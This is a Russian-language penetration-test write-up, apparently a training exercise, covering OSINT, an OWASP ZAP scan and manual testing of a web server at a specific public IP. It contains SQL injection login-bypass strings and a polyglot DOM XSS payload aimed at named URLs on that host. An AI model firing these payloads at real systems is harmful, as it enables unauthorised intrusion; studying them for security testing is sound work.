Этап 1. OSINT
для поиска информации об IP 92.51.39.106 использовался shodan.io и google.com
с помощью google search был найден сайт с информацией https://www.criminalip.io/asset/report/92.51.39.106
Владелец IP адреса TimeWeb Ltd. TW-VDS 
Hostname 1427771-cg36175.tw1.ru
Расположен в РФ, Санкт-Петербург
criminalip.io показал, что на данном IP есть открытые порты 22 (OpenSSH), 7799 (Tornado), 8060 (Apache)
Этот IP адрес имеет критичечкие уязвимости
имеется 68 уязвимостей 
Эксплоитов 6  

https://www.shodan.io/host/92.51.39.106
GeneralInformation
Hostnames 	1427771-cg36175.tw1.ru
Domains 	tw1.ru 
Country 	Russian Federation
City 	Saint Petersburg
Organization 	TimeWeb Ltd.
ISP 	TimeWeb Ltd.
ASN 	AS9123

 OpenPorts
22 (OpenSSH8.2p1 Ubuntu-4ubuntu0.2 ) и
 8060 :
 HTTP/1.1 200 OK
Date: Wed, 17 Jan 2024 13:08:58 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=6u3e4utp75gd4qt8lu5vv9s112; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3362
Content-Type: text/html

На основе предоставленной информации у нас цель для атаки http://92.51.39.106:8060/
Мы выявили уязвимый сервис запушенный на данном порту, который необходимо просканировать и в дальнейшем проэксплуатировать на основании полученной информации от сканирования

Этап 2. Scanning
На этом этапе используем open-source OWASP ZAP (Open Worldwide Application Security Project (OWASP) Zed Attack Proxy (ZAP))
Открытый исходный веб-сканер приложений для проверки безопасности.
Он предназначен для использования как теми, кто только начинает работать с приложениями для обеспечения безопасности, так и профессиональными специалистами по тестированию на проникновение.
Проект является одним из самых активных среди Open Worldwide Application Security Project (OWASP) и получил статус Flagship.
Когда используется как прокси-сервер, он позволяет пользователю манипулировать всем трафиком, который проходит через него, включая трафик с использованием HTTPS. Также может работать в режиме демона, который затем контролируется через REST API

Запуск будет осуществлен с помощью docker, с указанием цели атаки и выводом итогов в отдельный файл репорт с расширением html


docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t http://your-target-site -g full-zap-report.html

Объяснение параметров:

    -v $(pwd):/zap/wrk/:rw: Монтирует текущий рабочий каталог внутрь контейнера ZAP, что позволяет сохранить отчеты на вашем хосте.

    -t owasp/zap2docker-stable: Указывает Docker использовать образ ZAP.

    zap-full-scan.py: Запускает скрипт для полного сканирования.

    -t http://your-target-site: Указывает целевой сайт для сканирования.

    -g zap-report.html: Генерирует отчет в формате HTML с указанным именем файла.

Замените http://your-target-site на фактический URL вашего веб-приложения.

После выполнения этой команды, вы найдете сгенерированный отчет с именем zap-report.html в вашем текущем рабочем каталоге. Этот отчет будет содержать результаты базового сканирования на наличие уязвимостей в вашем веб-приложении.

Вариант запуска ZAP с графической оболочкой :
Установка : sudo apt install zaproxy

Далее в качестве "URL to attack:" указываем наш целевой сайт, в "Use ajax spider:" установить Chrome Headless. Запустить с помощью кнопки Attack
 

Этап 3. Testing

1. в ручную проведена SQL injection
SQL injection
http://92.51.39.106:8060/comments/preview_comment.php
admin' or '1'='1'# 

http://92.51.39.106:7799/server.html
admin' or 1=1--


Cross Site Scripting (DOM Based)
http://92.51.39.106:8060/#jaVasCript:/*-/*%60/*\%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397)%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert(5397)//%3E\x3e

http://92.51.39.106:8060/calendar.php#jaVasCript:/*-/*%60/*\%60/*'/*%22/**/(/*%20*/oNcliCk=alert(5397)%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert(5397)//%3E\x3e
